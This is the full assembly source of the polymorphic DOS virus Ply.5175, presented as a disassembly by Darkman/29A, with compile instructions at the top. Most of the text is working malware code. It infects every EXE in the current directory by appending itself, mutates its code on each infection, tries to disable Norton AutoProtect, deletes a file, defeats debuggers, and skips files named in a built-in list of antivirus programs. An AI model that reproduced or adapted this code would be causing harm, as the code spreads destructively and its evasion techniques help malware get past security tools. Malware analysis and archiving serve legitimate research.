   ; comment *
   ;                  Ply.5175
   ;               Disassembly by
   ;                 Darkman/29A
   ;
   ;   Ply.5175 is a 5175 bytes parasitic direct action EXE virus. Infects every
   ;   file in current directory, when executed, by appending the virus to the
   ;   infected file. Ply.5175 has an error handler, anti-heuristic techniques,
   ;   anti-debugging techniques, retro structures and is polymorphic in file by
   ;   using its internal polymorphic engine.
   ;
   ;   To compile Ply.5175 with Turbo Assembler v 4.0 type:
   ;     TASM /m PLY_5175.ASM
   ;     TLINK /t /x PLY_5175.OBJ
   ; *

   .model tiny
   .code
    org   100h              ; Origin of Ply.5175

   code_begin:
   delta_offset equ     $+01h       ; Delta offset
            mov     bp,100h         ; BP = delta offset
   poly_begin:
            mov     ax,cs       ; AX = code segment
            nop
            mov     ds,ax       ; DS =  "      "
            nop
            mov     es,ax       ; ES =  "      "
            nop

            mov     ax,100h         ; AX = offset of beginning of code
            sub     bp,ax       ; Subtract offset of beginning of ...
            nop

            sti             ; Set interrupt-enable flag
            nop
            nop
            cld             ; Clear direction flag
            nop
            nop

            mov     ax,2020h
            mov     si,(4e41h-2020h)    ; Disable AutoProtect and NAVTSR
            add     si,ax       ;    "         "       "    "
            nop
            mov     di,(4e55h-2020h)    ;    "         "       "    "
            add     di,ax       ;    "         "       "    "
            nop
            add     ax,(0fe02h-2020h)   ;    "         "       "    "
            int     2fh
            nop

            mov     ax,20e0h
            add     ax,(4100h-20e0h)    ; Delete file
            lea     dx,_ncdtree     ; DX = offset of _ncdtree
            add     dx,bp       ; Add delta offset
            nop
            int     21h
            nop

            xor     ax,ax       ; Zero AX
            nop
            mov     ds,ax       ; DS = segment of interrupt table
            nop
            mov     si,(2fh*04h)    ; SI = offset of interrupt vector 24h
            lea     di,int2f_addr   ; DI = offset of int2f_addr
            add     di,bp       ; Add delta offset
            nop
            mov     cx,04h      ; Move four bytes to int2f_addr
            rep     movsb       ; Move interrupt vector 2fh to int...
            nop

            mov     ax,cs       ; AX = code segment
            nop
            mov     ds,ax       ; DS =  "      "
            nop

            mov     ax,1202h        ; Get interrupt address
            mov     dx,24h      ; Get interrupt address of interru...
            call    int2f_simula

            mov     ax,cs       ; AX = code segment
            nop
            mov     es,ax       ; ES =  "      "
            nop

            mov     ax,(24h*04h)    ; AX = offset of interrupt vector 24h
            cmp     bx,ax       ; Debugging?
            nop
            je      prepare_exit    ; No debugging? Jump to prepare_exit
            nop

            mov     ax,(3501h-2020h)    ; Get interrupt vector 01h
            add     ax,2020h
            call    int21_simula

            lea     di,int01_off    ; DI = offset of int01_off
            add     di,bp       ; Add delta offset
            nop
            mov     [di],bx         ; Store offset of interrupt 01h
            nop

            mov     ax,cs       ; AX = code segment
            nop
            mov     es,ax       ; ES =  "      "
            nop

            mov     ax,(2501h-2020h)    ; Get interrupt vector 01h
            add     ax,2020h
            lea     dx,int01_virus  ; DX = offset of int01_virus
            add     dx,bp       ; Add delta offset
            nop
            call    int21_simula
   prepare_exit:
            lea     si,file_header  ; SI = offset of file_header
            add     si,bp       ; Add delta offset
            nop
            lea     di,instruct_ptr     ; SI = offset of instruct_ptr
            add     di,bp       ; Add delta offset
            nop

            mov     ax,[si+14h]     ; AX = instruction pointer
            stosw           ; Store instruction pointer
            nop
            nop
            mov     ax,[si+16h]     ; AX = code segment
            stosw           ; Store code segment
            nop
            nop
            mov     ax,[si+0eh]     ; AX = stack segment
            stosw           ; Store stack segment
            nop
            nop
            mov     ax,[si+10h]     ; AX = stack pointer
            stosw           ; Store stack pointer
            nop
            nop

            lea     si,poly_begin   ; SI = offset of poly_begin
            add     si,bp       ; Add delta offset
            nop
            mov     cx,(poly_end-poly_begin)/03h
   poly_loop:
            in      al,40h      ; AL = 8-bit random number
            nop
            mov     ah,al       ; AH =   "     "      "
            nop
            in      al,40h      ; AL =   "     "      "
            nop
            xor     al,ah       ; AL =   "     "      "
            nop
            and     al,00011111b    ; AL = random number between zero ...
            nop

            push    cx          ; Save CX at stack
            nop
            nop
            push    si          ; Save SI at stack
            nop
            nop

            cmp     al,00h      ; Prepend a NOP to the opcode?
            nop
            jne     test_append     ; Not equal? Jump to test_append
            nop

            mov     al,[si]         ; AL = first byte of three-bytes b...
            nop
            cmp     al,90h      ; NOP (opcode 90h)?
            nop
            je      dont_poly       ; Equal? Jump to dont_poly
            nop

            mov     al,[si+02h]     ; AL = third byte of three-byte block
            cmp     al,90h      ; NOP (opcode 90h)
            nop
            jne     dont_poly       ; Not equal? Jump to dont_poly
            nop

            mov     ax,[si]         ; AX = first word of three-bytes b...
            nop
            lea     bx,poly_buffer  ; BX = offset of poly_buffer
            add     bx,bp       ; Add delta offset
            nop
            mov     [bx+01h],ax     ; Store first word of three-bytes ...

            cmp     al,0ebh         ; JMP imm8 (opcode 0ebh)
            nop
            je      dec_imm8        ; Equal? Jump to dec_imm8
            nop

            and     al,11110000b
            nop
            cmp     al,70h      ; Jump on condition?
            nop
            jne     prepend_nop     ; Not equal? Jump to prepend_nop
            nop
   dec_imm8:
            dec     byte ptr [bx+02h]   ; Decrease 8-bit immediate
   prepend_nop:
            mov     al,90h      ; NOP (opcode 90h)
            nop
            mov     [bx],al         ; Prepend a NOP to the opcode
            nop

            mov     di,si       ; DI = offset of current three-byt...
            nop
            mov     si,bx       ; SI = offset of poly_buffer
            nop
            mov     cx,03h      ; Move three bytes
            rep     movsb       ; Move three-bytes block to offset...
            nop
   dont_poly:
            jmp     test_loop
   test_append:
            cmp     al,01h      ; Append a NOP to the opcode?
            nop
            jne     test_create     ; Not equal? Jump to test_create
            nop

            mov     al,[si]         ; AL = first byte of three-bytes b...
            nop
            cmp     al,90h      ; NOP (opcode 90h)?
            nop
            jne     dont_poly_      ; Not equal? Jump to dont_poly_
            nop

            mov     ax,[si+01h]     ; AX = second word of three-bytes ...
            lea     bx,poly_buffer  ; BX = offset of poly_buffer
            add     bx,bp       ; Add delta offset
            nop
            mov     [bx],ax         ; Store second word of three-bytes...
            nop

            cmp     al,0ebh         ; JMP imm8 (opcode 0ebh)
            nop
            je      dec_imm8_       ; Equal? Jump to dec_imm8_
            nop

            and     al,11110000b
            nop
            cmp     al,70h      ; Jump on condition?
            nop
            jne     append_nop      ; Not equal? Jump to append_nop
            nop
   dec_imm8_:
            inc     byte ptr [bx+01h]   ; Decrease 8-bit immediate
   append_nop:
            mov     al,90h      ; NOP (opcode 90h)
            nop
            mov     [bx+02h],al     ; Append a NOP to the opcode

            mov     di,si       ; DI = offset of current three-byt...
            nop
            mov     si,bx       ; SI = offset of poly_buffer
            nop
            mov     cx,03h      ; Move three bytes
            rep     movsb       ; Move three-bytes block to offset...
            nop
   dont_poly_:
            jmp     test_loop
   test_create:
            cmp     al,02h      ; Create a CALL imm16 to the opcode?
            nop
            jne     delete_call     ; Not equal? Jump to delete_call
            nop

            mov     ax,[si]         ; AX = first word of three-bytes b...
            nop
            cmp     al,90h      ; NOP (opcode 90h)?
            nop
            jne     create_call     ; Not equal? Jump to create_call
            nop

            mov     al,ah       ; AL = second byte of three-bytes ...
            nop
   create_call:
            cmp     al,0e9h         ; JMP imm16 (opcode 0e9h)
            nop
            je      call_exit       ; Equal? Jump to call_exit
            nop
            cmp     al,0e8h         ; CALL imm16 (opcode 0e8h)
            nop
            je      call_exit       ; Equal? Jump to call_exit
            nop
            cmp     al,0ebh         ; JMP imm8 (opcode 0ebh)
            nop
            je      call_exit       ; Equal? Jump to call_exit
            nop
            cmp     al,0c3h         ; RET (opcode 0c3h)
            nop
            je      call_exit       ; Equal? Jump to call_exit
            nop

            and     al,11110000b
            nop
            cmp     al,70h      ; Jump on condition?
            nop
            je      call_exit       ; Equal? Jump to call_exit
            nop
            cmp     al,50h      ; PUSH reg16/POP reg16?
            nop
            je      call_exit       ; Equal? Jump to call_exit
            nop

            call    get_poly_off

            mov     cx,03h      ; Move three bytes
            rep     movsb       ; Move three-bytes block to offset...
            nop

            mov     al,0c3h         ; RET (opcode 0c3h)
            nop
            stosb           ; Store RET
            nop
            nop

            in      al,40h      ; AL = 8-bit random number
            nop
            stosb           ; Store 8-bit random number
            nop
            nop

            in      al,40h      ; AL = 8-bit random number
            nop
            stosb           ; Store 8-bit random number
            nop
            nop

            mov     al,0e8h         ; CALL imm16 (opcode 0e8h)
            nop
            lea     bx,poly_buffer  ; BX = offset of poly_buffer
            add     bx,bp       ; Add delta offset
            nop
            mov     [bx],al         ; Create a CALL imm16 to the opcode
            nop

            mov     ax,di       ; AX = random offset of polymorphi...
            nop
            sub     ax,si       ; Subtract offset of current three...
            nop
            sub     ax,06h      ; Subtract size of six-bytes block
            mov     [bx+01h],ax     ; Store 16-bit immediate

            mov     di,si       ; SI = offset of current three-byt...
            nop
            mov     ax,03h      ; AX = size of opcode CALL imm16
            sub     di,ax       ; Subtract size of opcode CALL imm...
            nop
            mov     si,bx       ; SI = offset of poly_buffer
            nop
            mov     cx,03h      ; Move three bytes
            rep     movsb       ; Move three-bytes block to offset...
            nop
   call_exit:
            jmp     test_loop
   delete_call:
            cmp     al,03h      ; Delete previously created CALL i...
            nop
            jne     test_create_    ; Not equal? Jump to test_create_
            nop

            mov     al,[si]         ; AL = first byte of three-bytes b...
            nop
            cmp     al,0e8h         ; CALL imm16 (opcode 0e8h)?
            nop
            jne     call_exit_      ; Not equal? Jump to call_exit_
            nop

            mov     ax,[si+01h]     ; AX = 16-bit immediate
            add     ax,03h      ; Add size of opcode CALL imm16

            mov     di,si       ; DI = offset of current three-byt...
            nop
            add     si,ax       ; Add 16-bit immediate
            nop
            lea     bx,poly_blocks  ; BX = offset of poly_blocks
            add     bx,bp       ; Add delta offset
            nop
            cmp     si,bx       ; 16-bit immediate within polymorp...
            nop
            jb      call_exit_      ; Below? Jump to call_exit_
            nop

            mov     cx,03h      ; Move three bytes
            rep     movsb       ; Move three-bytes block to offset...
            nop

            mov     al,90h      ; NOP (opcode 90h)
            nop
            mov     ah,al       ; NOP; NOP (opcode 90h,90h)
            nop
            mov     [si-03h],ax     ; Store NOP; NOP

            in      al,40h      ; AL = 8-bit random number
            nop
            mov     [si-01h],al     ; Store 8-bit random number

            in      al,40h      ; AL = 8-bit random number
            nop
            mov     [si],al         ; Store 8-bit random number
            nop
   call_exit_:
            jmp     test_loop
   test_create_:
            cmp     al,04h      ; Create a JMP imm16 to the opcode?
            nop
            jne     delete_jmp      ; Not equal? Jump to delete_jmp
            nop

            mov     ax,[si]         ; AX = first word of three-bytes b...
            nop
            cmp     al,90h      ; NOP (opcode 90h)?
            nop
            jne     create_jmp      ; Not equal? Jump to create_jmp
            nop

            mov     al,ah       ; AL = second byte of three-bytes ...
            nop
   create_jmp:
            cmp     al,0e9h         ; JMP imm16 (opcode 0e9h)?
            nop
            je      jmp_exit        ; Equal? Jump to jmp_exit
            nop
            cmp     al,0e8h         ; CALL imm16 (opcode 0e8h)
            nop
            je      jmp_exit        ; Equal? Jump to jmp_exit
            nop
            cmp     al,0ebh         ; JMP imm8 (opcode 0ebh)
            nop
            je      jmp_exit        ; Equal? Jump to jmp_exit
            nop

            and     al,11110000b
            nop
            cmp     al,70h      ; Jump on condition?
            nop
            je      jmp_exit        ; Equal? Jump to jmp_exit
            nop

            call    get_poly_off

            mov     cx,03h      ; Move three bytes
            rep     movsb       ; Move three-bytes block to offset...
            nop

            mov     al,0e9h         ; JMP imm16 (opcode 0e9h)
            nop
            stosb           ; Store JMP imm16
            nop
            nop

            mov     ax,di       ; AX = random offset of polymorphi...
            nop
            sub     ax,si       ; Subtract offset of current three...
            nop
            neg     ax          ; Negate AX
            nop
            sub     ax,02h      ; Subtract two from 16-bit immediate
            stosw           ; Store 16-bit immediate
            nop
            nop

            mov     al,0e9h         ; JMP imm16 (opcode 0e9h)
            nop
            lea     bx,poly_buffer  ; BX = offset of poly_buffer
            add     bx,bp       ; Add delta offset
            nop
            mov     [bx],al         ; Create a JMP imm16 to the opcode
            nop

            mov     ax,di       ; AX = random offset of polymorphi...
            nop
            sub     ax,si       ; Subtract offset of current three...
            nop
            sub     ax,06h      ; Subtract size of six-bytes block
            mov     [bx+01h],ax     ; Store 16-bit immediate

            mov     di,si       ; SI = offset of current three-byt...
            nop
            mov     ax,03h      ; AX = size of opcode CALL imm16
            sub     di,ax       ; Subtract size of opcode CALL imm...
            nop
            mov     si,bx       ; SI = offset of poly_buffer
            nop
            mov     cx,03h      ; Move three bytes
            rep     movsb       ; Move three-bytes block to offset...
            nop
   jmp_exit:
            jmp     test_loop
            nop
   delete_jmp:
            cmp     al,05h      ; Delete previously created JMP im...
            nop
            jne     test_loop       ; Not equal? Jump to test_loop
            nop

            mov     al,[si]         ; AL = first byte of three-bytes b...
            nop
            cmp     al,0e9h         ; JMP imm16 (opcode 0e9h)?
            nop
            jne     jmp_exit_       ; Not equal? Jump to jmp_exit_
            nop

            mov     ax,[si+01h]     ; AX = 16-bit immediate
            add     ax,03h      ; Add size of opcode CALL imm16

            mov     di,si       ; DI = offset of current three-byt...
            nop
            add     si,ax       ; Add 16-bit immediate
            nop
            lea     bx,poly_blocks  ; BX = offset of poly_blocks
            add     bx,bp       ; Add delta offset
            nop
            cmp     si,bx       ; 16-bit immediate within polymorp...
            nop
            jb      jmp_exit_       ; Below? Jump to jmp_exit_
            nop

            mov     cx,03h      ; Move three bytes
            rep     movsb       ; Move three-bytes block to offset...
            nop

            mov     al,90h      ; NOP (opcode 90h)
            nop
            mov     ah,al       ; NOP; NOP (opcode 90h,90h)
            nop
            mov     [si-03h],ax     ; Store NOP; NOP

            in      al,40h      ; AL = 8-bit random number
            nop
            mov     [si-01h],al     ; Store 8-bit random number

            in      al,40h      ; AL = 8-bit random number
            nop
            mov     [si],al         ; Store 8-bit random number
            nop
   jmp_exit_:
            jmp     test_loop
            nop
   test_loop:
            pop     si          ; Load SI from stack
            nop
            nop
            pop     cx          ; Load CX from stack
            nop
            nop

            mov     ax,03h      ; AX = size of block
            add     si,ax       ; SI = offset of next three-byte b...
            nop

            dec     cx          ; Decrease CX
            nop
            nop
            jz      poly_exit       ; Zero? Jump to poly_exit
            nop

            jmp     poly_loop
   poly_exit:
            jmp     set_dta_addr
            nop

   get_poly_off proc    near        ; Get random offset of polymorphic...
            in      al,40h      ; AL = 8-bit random number
            nop
            mov     ah,al       ; AH =   "     "      "
            nop
            in      al,40h      ; AL = 8-bit random number
            nop
            mov     di,ax       ; DI = 16-bit random number
            nop
            mov     ax,(poly_end-poly_begin)/03h
   get_rnd_num:
            sub     di,ax       ; Subtract number of polymorphic b...
            nop
            cmp     di,ax       ; Too large a 16-bit random number?
            nop
            jae     get_rnd_num     ; Above or equal? Jump to get_rnd_num
            nop

            mov     ax,di       ; AX = 16-bit random number within...
            nop

            add     di,ax       ; Add number of polymorphic blocks
            nop
            add     di,ax       ;  "    "    "       "        "
            nop
            add     di,ax       ;  "    "    "       "        "
            nop
            add     di,ax       ;  "    "    "       "        "
            nop
            add     di,ax       ;  "    "    "       "        "
            nop

            lea     ax,poly_blocks  ; AX = offset of poly_blocks
            add     di,ax       ; Add offset of poly_blocks to ran...
            nop
            add     di,bp       ; Add delta offset
            nop

            mov     al,90h      ; NOP (opcode 90h)
            nop
            mov     ah,al       ; NOP; NOP (opcode 90h,90h)
            nop
            cmp     [di],ax         ; Offset already in use?
            nop
            jne     get_poly_off    ; Not equal? Jump to get_poly_off
            nop

            ret             ; Return!
            nop
            nop
            endp
   set_dta_addr:
            mov     ah,2fh      ; Get disk transfer area address
            nop
            int     21h
            nop
            push    bx          ; Save BX at stack
            nop
            nop
            mov     ax,es       ; ES = segment of disk transfer area
            nop
            push    ax          ; Save AX at stack
            nop
            nop

            mov     ax,cs       ; AX = code segment
            nop
            mov     es,ax       ; ES =  "      "
            nop

            mov     ah,1ah      ; Set disk transfer area address
            nop
            lea     dx,dta      ; DX = offset of dta
            add     dx,bp       ; Add delta offset
            nop
            mov     di,dx       ; DI = offset of dta
            nop
            int     21h
            nop

            mov     ax,3524h        ; Get interrupt vector 24h
            int     21h
            nop
            push    bx          ; Save BX at stack
            nop
            nop
            mov     ax,es       ; ES = segment of interrupt 24h
            nop
            push    ax          ; Save AX at stack
            nop
            nop

            mov     ax,cs       ; AX = code segment
            nop
            mov     es,ax       ; ES =  "      "
            nop

            mov     ax,2524h        ; Get interrupt vector 24h
            lea     dx,int24_virus  ; DX = offset of int24_virus
            add     dx,bp       ; Add delta offset
            nop
            int     21h
            nop

            xor     ax,ax       ; Zero AX
            nop
            mov     ds,ax       ; DS = segment of interrupt table
            nop
            mov     si,(2ah*04h)    ; SI = offset of interrupt vector 2ah
            lodsw           ; AX = offset of interrupt 2ah
            nop
            nop
            push    ax          ; Save AX at stack
            nop
            nop
            lodsw           ; AX = segment of interrupt 2ah
            nop
            nop
            push    ax          ; Save AX at stack
            nop
            nop
            lea     ax,int2a_virus  ; AX = offset of int2a_virus
            add     ax,bp       ; Add delta offset
            nop
            mov     [si-04h],ax     ; Set interrupt offset 2ah
            mov     ax,cs       ; AX = code segment
            nop
            mov     [si-02h],ax     ; Set interrupt segment 2ah

            mov     ax,cs       ; AX = code segment
            nop
            mov     ds,ax       ; DS =  "      "
            nop

            mov     ax,(4e00h-2020h)    ; Find first matching file
            add     ax,2020h
            mov     cx,0000000000000111b
            lea     dx,file_specifi     ; DX = offset of file_specifi
            add     dx,bp       ; Add delta offset
            nop

            mov     bx,dx       ; BX = offset of file_specifi
            nop
            mov     al,'E'
            nop
            mov     [bx+02h],al     ; Correct the file specification

            jmp     find_first
            nop
   find_next:
            mov     ax,(4f00h-2020h)    ; Find next matching file
            add     ax,2020h
   find_first:
            int     21h
            nop
            jnc     examine_name    ; No error? Jump to examine_name
            nop

            xor     ax,ax       ; Zero AX
            nop
            mov     es,ax       ; ES = segment of interrupt table
            nop
            mov     di,(2ah*04h)    ; DI = offset of interrupt vector 2ah
            pop     bx          ; Load BX from stack
            nop
            nop
            pop     ax          ; Load AX from stack
            nop
            nop
            stosw           ; Set interrupt offset 2ah
            nop
            nop
            mov     ax,bx       ; AX = segment of interrupt 2ah
            nop
            stosw           ; Set inerrupt segment 2ah
            nop
            nop

            mov     ax,cs       ; AX = code segment
            nop
            mov     es,ax       ; ES =  "      "
            nop

            pop     ax          ; Load AX from stack
            nop
            nop
            mov     ds,ax       ; DS = segment of interrupt 24h
            nop
            pop     dx          ; Load DX from stack
            nop
            nop
            mov     ax,2524h        ; Set interrupt vector 24h
            int     21h
            nop

            mov     ax,cs       ; AX = code segment
            nop
            mov     ds,ax       ; DS =  "      "
            nop

            pop     ax          ; Load AX from stack
            nop
            nop
            mov     ds,ax       ; DS = segment of disk transfer area
            nop
            pop     dx          ; Load DX from stack
            nop
            nop
            mov     ax,(1a00h+2020h)    ; Set disk transfer area address
            sub     ax,2020h
            mov     dx,80h      ; DX = offset of default disk tran...
            int     21h
            nop

            mov     ax,cs       ; AX = code segment
            nop
            mov     ds,ax       ; DS =  "      "
            nop

            jmp     virus_exit
   examine_name:
            mov     al,'V'
            nop
            mov     [bx+02h],al     ; Correct the file specification

            push    di          ; Save DI at stack
            nop
            nop
            lea     si,table_begin  ; SI = offset of table_begin
            add     si,bp       ; Add delta offset
            nop
            lea     di,filename     ; DI = offset of filename
            add     di,bp       ; Add delta offset
            nop
   next_name:
            mov     bx,si       ; BX = offset within table
            nop
            lodsb           ; AL = size of filename
            nop
            nop
            cmp     al,00h      ; End of table?
            nop
            je      open_file       ; Equal? Jump to open_file
            nop

            mov     ah,00h      ; AX = size of filename
            nop
            mov     cx,ax       ; CX =  "   "     "
            nop
            add     bx,cx       ; BX = offset of next filename
            nop
            inc     bx          ; BX =   "    "   "      "
            nop
            nop

            push    di          ; Save DI at stack
            nop
            nop
            rep     cmpsb       ; Compare filename with filname in...
            nop
            pop     di          ; Load DI from stack
            nop
            nop
            je      jmp_fnd_nxt     ; Equal? Jump to jmp_fnd_nxt
            nop

            mov     si,bx       ; SI = offset of next filename
            nop

            jmp     next_name
            nop
   jmp_fnd_nxt:
            pop     di          ; Load DI from stack
            nop
            nop

            jmp     find_next
   open_file:
            pop     di          ; Load DI from stack
            nop
            nop

            lea     si,file_header  ; SI = offset of file_header
            add     si,bp       ; Add delta offset
            nop

            mov     ax,3d00h        ; Open file (read)
            lea     dx,filename     ; DX = offset of filename
            add     dx,bp       ; Add delta offset
            nop
            int     21h
            nop
            mov     bx,ax       ; BX = file handle
            nop

            mov     ah,3fh      ; Read from file
            nop
            mov     dx,si       ; DX = offset of file_header
            nop
            mov     cx,1ah      ; Read twenty-six bytes
            int     21h
            nop

            mov     ah,3eh      ; Close file
            nop
            int     21h
            nop

            mov     ax,('ZM'+2020h)     ; EXE signature
            sub     ax,2020h
            cmp     [si],ax         ; Found EXE signature?
            nop
            je      examine_file    ; Equal? Jump to examine_file
            nop

            xchg    ah,al       ; Exchange EXE signature
            nop
            cmp     [si],ax         ; Found EXE signature?
            nop
            je      examine_file    ; Equal? Jump to examine_file
            nop
   jmp_fnd_nxt_:
            jmp     find_next
   examine_file:
            mov     ax,2020h
            cmp     [si+12h],ax     ; Already infected?
            je      jmp_fnd_nxt_    ; Equal? Jump to jmp_fnd_nxt_
            nop

            mov     ax,(4301h-2020h)    ; Set file attributes
            add     ax,2020h
            xor     cx,cx       ; CX = new file attributes
            nop
            lea     dx,filename     ; DX = offset of filename
            add     dx,bp       ; Add delta offset
            nop
            int     21h
            nop

            mov     ax,(3d02h-2020h)    ; Open file (read/write)
            add     ax,2020h
            lea     dx,filename     ; DX = offset of filename
            add     dx,bp       ; Add delta offset
            nop
            int     21h
            nop
            mov     bx,ax       ; BX = file handle
            nop

            mov     ax,4202h        ; Set current file position (EOF)
            xor     cx,cx       ; Zero CX
            nop
            xor     dx,dx       ; Zero DX
            nop
            int     21h
            nop

            mov     ax,(4000h-2020h)    ; Write to file
            add     ax,2020h
            mov     cx,(code_end-code_begin)
            lea     dx,code_begin   ; DX = offset of code_begin
            add     dx,bp       ; Add delta offset
            nop
            int     21h
            nop

            mov     ax,[si+08h]     ; AX = header size in paragraphs
            mov     cl,04h      ; Multiply by paragraphs
            nop
            shl     ax,cl       ; AX = header size
            nop
            push    bx          ; Save BX at stack
            nop
            nop
            xchg    ax,bx       ; BX = header size
            nop
            nop

            mov     ax,[di+1ah]     ; AX = low-order word of filesize
            mov     dx,[di+1ch]     ; DX = high-order word of filesize
            push    ax          ; Save AX at stack
            nop
            nop
            push    dx          ; Save DX at stack
            nop
            nop

            sub     ax,bx       ; Subtract header size from filesize
            nop
            sbb     dx,00h      ; Convert to 32-bit
            mov     cx,10h
            div     cx          ; Divide by paragraphs
            nop
            mov     cx,dx       ; CX = low-order word of filesize ...
            nop
            lea     bx,entry_point-100h ; BX = offset of entry_point
            add     dx,bx       ; Add offset of entry_point to low...
            nop
            mov     [si+14h],dx     ; Store instruction pointer
            mov     [si+16h],ax     ; Store code segment

            lea     bx,delta_offset     ; BX = offset of delta_offset
            add     bx,bp       ; Add delta offset
            nop
            mov     [bx],cx         ; Store delta offset
            nop

            inc     ax          ; Increase AX
            nop
            nop
            mov     [si+0eh],ax     ; Store stack segment

            mov     dx,cx       ; DX = low-order word of filesize ...
            nop
            mov     ax,(code_end-code_begin+0c0h)
            add     dx,ax       ; DX = stack pointer
            nop
            mov     ax,1111111111111110b
            and     dx,ax       ; DX =   "      "
            nop
            mov     [si+10h],dx     ; Store stack pointer

            mov     ax,2020h        ; AX = infection mark
            mov     [si+12h],ax     ; Store infection mark

            pop     dx          ; Load DX from stack
            nop
            nop
            pop     ax          ; Load AX from stack
            nop
            nop
            add     ax,(code_end-code_begin)
            adc     dx,00h      ; Convert to 32-bit

            mov     cl,09h
            nop
            push    ax          ; Save AX at stack
            nop
            nop
            shr     ax,cl       ; Multiply by pages
            nop
            ror     dx,cl       ;     "    "    "
            nop
            stc             ; Set carry flag
            nop
            nop
            adc     dx,ax       ; DX = total number of 512-bytes p...
            nop
            pop     ax          ; Load AX from stack
            nop
            nop
            and     ah,00000001b
            mov     [si+04h],dx     ; Store totalt number of 512-bytes...
            mov     [si+02h],ax     ; Number of bytes in last 512-byte...
            pop     bx          ; Load BX from stack
            nop
            nop

            mov     ax,4201h        ; Set current file position (CFP)
            mov     cx,-01h
            mov     dx,-(code_end-delta_offset)
            int     21h
            nop

            mov     ax,(4000h-2020h)    ; Write to file
            add     ax,2020h
            mov     cx,02h      ; Write two bytes
            lea     dx,delta_offset     ; DX = offset of delta_offset
            add     dx,bp       ; Add delta offset
            nop
            int     21h
            nop

            mov     ax,4200h        ; Set current file position (SOF)
            xor     cx,cx       ; Zero CX
            nop
            xor     dx,dx       ; Zero DX
            nop
            int     21h
            nop

            mov     ax,(4000h-2020h)    ; Write to file
            add     ax,2020h
            mov     cx,1ah      ; Write twenty-six bytes
            mov     dx,si       ; DX = offset of file_header
            nop
            int     21h
            nop

            mov     ax,(5701h-2020h)    ; Set file's date and time
            add     ax,2020h
            mov     cx,[di+16h]     ; CX = file time
            mov     dx,[di+18h]     ; DX = file date
            int     21h
            nop

            mov     ah,3eh      ; Close file
            nop
            int     21h
            nop

            mov     ax,(4301h-2020h)    ; Set file attributes
            add     ax,2020h
            mov     ch,00h      ; Zero CH
            nop
            mov     cl,[di+15h]     ; CL = file attribute
            lea     dx,filename     ; DX = offset of filename
            add     dx,bp       ; Add delta offset
            nop
            int     21h
            nop

            jmp     find_next
   virus_exit:
            mov     ax,1202h        ; Get interrupt address
            mov     dx,24h      ; Get interrupt address of interru...
            call    int2f_simula

            mov     ax,cs       ; AX = code segment
            nop
            mov     es,ax       ; ES =  "      "
            nop

            mov     ax,(24h*04h)    ; AX = offset of interrupt vector 24h
            cmp     bx,ax       ; Debugging?
            nop
            je      virus_exit_     ; No debugging? Jump to virus_exit_
            nop

            mov     ax,3500h        ; Get interrupt vector 00h
            int     21h
            nop

            lea     si,int01_off    ; SI = offset of int01_off
            add     si,bp       ; Add delta offset
            nop
            lodsw           ; AX = offset of interrupt 01h
            nop
            nop
            mov     dx,ax       ; DX =   "    "      "      "
            nop

            mov     ax,es       ; AX = segment of interrupt 00h
            nop
            mov     ds,ax       ; DS =    "    "      "      "
            nop

            mov     ax,(2501h-2020h)    ; Set interrupt vector 01h
            add     ax,2020h
            int     21h
            nop

            mov     ax,cs       ; AX = code segment
            nop
            mov     ds,ax       ; DS =  "      "
            nop
            mov     es,ax       ; ES =  "      "
            nop
   eternal_loop:
            jmp     eternal_loop
            nop
   virus_exit_:
            mov     ah,62h      ; Get current PSP address
            nop
            int     21h
            nop
            mov     es,bx       ; ES = segment of PSP for current ...
            nop

            mov     cx,bx       ; CX =    "    "   "   "     "     "
            nop
            add     cx,10h      ; CX = segment of beginning of code

            lea     si,instruct_ptr     ; SI = offset of instruct_ptr
            add     si,bp       ; Add delta offset
            nop

            add     [si+02h],cx     ; Add segment of beginning of code...
            add     cx,[si+04h]     ; Add original stack segment to se...

            cli             ; Clear interrupt-enable flag
            nop
            nop
            xor     ax,ax       ; Zero AX
            nop
   poly_end:
            mov     sp,[si+06h]     ; SP = stack pointer
            mov     ss,cx       ; SS = stack segment
            sti             ; Set interrupt-enable flag

            push    ax          ; Save AX at stack

            mov     ds,bx       ; DS = segment of PSP for current ...

            db      0eah        ; JMP imm32 (opcode 0eah)
   instruct_ptr dw      ?           ; Instruction pointer
   code_seg     dw      ?           ; Code segment

   stack_seg    dw      ?           ; Stack segment
   stack_ptr    dw      ?           ; Stack pointer

   int24_virus  proc    near        ; Interrupt 24h of Ply.5175
            mov     al,03h      ; Fail system call in progress

   int01_virus  proc    near        ; Interrupt 01h of Ply.5175
   int2a_virus  proc    near        ; Interrupt 2ah of Ply.5175
            iret            ; Interrupt return!
            endp
            endp
            endp

   int2f_simula proc    near        ; Simulate interrupt 21h
            push    dx          ; Load DX from stack

            pushf
            db      9ah         ; CALL imm32 (opcode 9ah)
   int2f_addr   dd      ?           ; Address of interrupt 2fh

            pop     dx          ; Load DX from stack

            ret             ; Return!
            endp

   int21_simula proc    near        ; Simulate interrupt 21h
            segcs           ; Code segment as source segment
            int     21h
            nop

            ret             ; Return!
            endp

            db      00h
   int01_off    dw      ?           ; Offset of interrupt 01h
            db      00h
   entry_point:
            jmp     code_begin

   file_specifi db      '*.VXE',00h         ; File specification
   file_header  dw      0ah dup(?),00h,0fff0h,?
            db      00h
   poly_buffer  db      03h dup(?)      ; Polymorphic buffer
   table_begin  db      04h,'AVP.'          ; AntiViral Toolkit Pro
            db      08h,'AVPLITE.'      ; AVPLite
            db      06h,'AVPVE.'        ; AVP Virus Encyclopedia
            db      04h,'BAIT'          ; Bait file
            db      06h,'EICAR.'        ; EICAR-ANTIVIRUS-TEST-FILE
            db      07h,'EMM386.'       ; Microsoft expanded memory manage...
            db      07h,'F-PROT.'       ; F-PROT
            db      06h,'FV386.'
            db      05h,'FV86.'
            db      05h,'MSAV.'         ; Microsoft Anti-Virus
            db      09h,'MVTOOL10.'
            db      05h,'SCAN.'         ; McAfee ViruScan
            db      07h,'TBSCAN.'       ; Thunderbyte virus detector
            db      05h,'TBAV.'         ; Thunderbyte menu
            db      08h,'TBCHECK.'      ; TbCheck, Resident integrity checker
            db      08h,'TBCLEAN.'      ; Thunderbyte clean utility
            db      07h,'TBDISK.'       ; TbDisk, Disk guard
            db      09h,'TBDRIVER.'     ; TbDriver, TBAV TSR utilities
            db      07h,'TBFILE.'       ; TbFile, software guard
            db      09h,'TBGENSIG.'     ; TbGenSig, signature file compiler
            db      06h,'TBKEY.'        ; TbKey
            db      06h,'TBLOG.'        ; TbLog, TBAV automatic log utility
            db      06h,'TBMEM.'        ; TbMem, Memory guard
            db      08h,'TBSETUP.'      ; Thunderbyte software setup
            db      08h,'TBSCANX.'      ; TbScanX resident virus scanner
